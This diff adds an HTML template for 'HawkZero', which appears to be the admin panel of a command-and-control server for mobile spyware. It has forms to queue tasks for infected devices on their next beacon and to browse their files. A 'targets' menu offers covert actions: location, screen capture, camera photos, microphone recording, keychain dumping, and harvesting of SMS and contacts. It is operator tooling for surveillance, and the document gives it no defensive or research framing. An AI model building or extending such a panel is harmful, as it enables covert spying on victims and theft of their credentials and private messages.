@@ -1,0 +1,116 @@
+{% include 'partials/head.html' %}
+<div class="shell">
+  {% include 'partials/sidebar.html' %}
+
+  {# data-theme colours every .hz-btn in this section to match its banner #}
+  <main class="main" data-theme="{{ section.theme }}">
+    <div class="topbar">
+      <div class="crumbs">HawkZero / <b>{{ section.label }}</b></div>
+      <div class="hz-btn-group">
+        <a class="hz-btn hz-btn--sm hz-btn--ghost" href="/admin">&#8592; Dashboard</a>
+        <a class="hz-btn hz-btn--sm" href="/admin/{{ section.slug }}">Refresh</a>
+      </div>
+    </div>
+
+    <h1 style="margin-bottom:18px">{{ section.label }}</h1>
+
+    <section class="panel">
+      <header>
+        <div>
+          <h2>{{ section.label }}</h2>
+          <p class="muted" style="margin:4px 0 0">{{ section.blurb }}</p>
+        </div>
+        <div class="hz-btn-group">
+          <button class="hz-btn" type="button"><span class="hz-btn__icon">+</span> New</button>
+          <button class="hz-btn hz-btn--ghost" type="button">Export</button>
+          <button class="hz-btn hz-btn--ghost hz-btn--danger" type="button">Purge</button>
+        </div>
+      </header>
+
+      <table class="hz">
+        <thead><tr>{% for c in columns %}<th>{{ c }}</th>{% endfor %}</tr></thead>
+        <tbody>
+        {% for row in rows %}
+          <tr>{% for cell in row %}<td>{{ cell }}</td>{% endfor %}</tr>
+        {% else %}
+          <tr><td colspan="{{ columns|length }}" class="muted">{{ empty or 'No records.' }}</td></tr>
+        {% endfor %}
+        </tbody>
+      </table>
+    </section>
+
+    {% if section.slug == 'console' %}
+    <section class="panel">
+      <header><h2>Dispatch task</h2>
+        <span class="muted" style="font-size:.8rem">queued tasks are delivered on the next beacon</span>
+      </header>
+      <form class="row" method="post" action="/admin/console">
+        <div class="hz-field" style="min-width:200px">
+          <select class="hz-input" name="device">
+            {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
+          </select>
+        </div>
+        <div class="hz-field" style="min-width:200px">
+          <select class="hz-input" name="type">
+            {% for t in task_types %}<option value="{{ t }}">{{ t }}</option>{% endfor %}
+          </select>
+        </div>
+        <div class="hz-field" style="flex:1;min-width:240px">
+          <input class="hz-input" type="text" name="args" placeholder='{"path":"/var/mobile"}'>
+        </div>
+        <button class="hz-btn" type="submit">Send</button>
+      </form>
+      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
+    </section>
+    {% endif %}
+
+    {% if section.slug == 'files' %}
+    <section class="panel">
+      <header><h2>Browse path</h2>
+        <span class="muted" style="font-size:.8rem">runs fs_list on the target</span>
+      </header>
+      <form class="row" method="get" action="/admin/files">
+        <div class="hz-field" style="min-width:200px">
+          <select class="hz-input" name="device">
+            {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
+          </select>
+        </div>
+        <div class="hz-field" style="flex:1;min-width:240px">
+          <input class="hz-input" type="text" name="path" value="{{ path or '/var/mobile' }}">
+        </div>
+        <button class="hz-btn" type="submit">List</button>
+      </form>
+      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
+    </section>
+    {% endif %}
+
+    {% if section.slug == 'targets' %}
+    <section class="panel">
+      <header><h2>Quick actions</h2></header>
+      <form class="row" method="post" action="/admin/targets">
+        <div class="hz-field" style="min-width:200px">
+          <select class="hz-input" name="device">
+            {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
+          </select>
+        </div>
+        <div class="hz-field" style="min-width:200px">
+          <select class="hz-input" name="type">
+            <option value="sysinfo">sysinfo</option>
+            <option value="procs">procs</option>
+            <option value="location_once">location_once</option>
+            <option value="screen_frame">screen_frame</option>
+            <option value="camera_photo">camera_photo</option>
+            <option value="mic_record">mic_record</option>
+            <option value="keychain">keychain</option>
+            <option value="harvest_sms">harvest_sms</option>
+            <option value="harvest_contacts">harvest_contacts</option>
+          </select>
+        </div>
+        <button class="hz-btn" type="submit">Run</button>
+      </form>
+      {% if flash %}<div class="alert" style="margin-top:14px">{{ flash }}</div>{% endif %}
+    </section>
+    {% endif %}
+  </main>
+</div>
+{% include 'partials/foot.html' %}
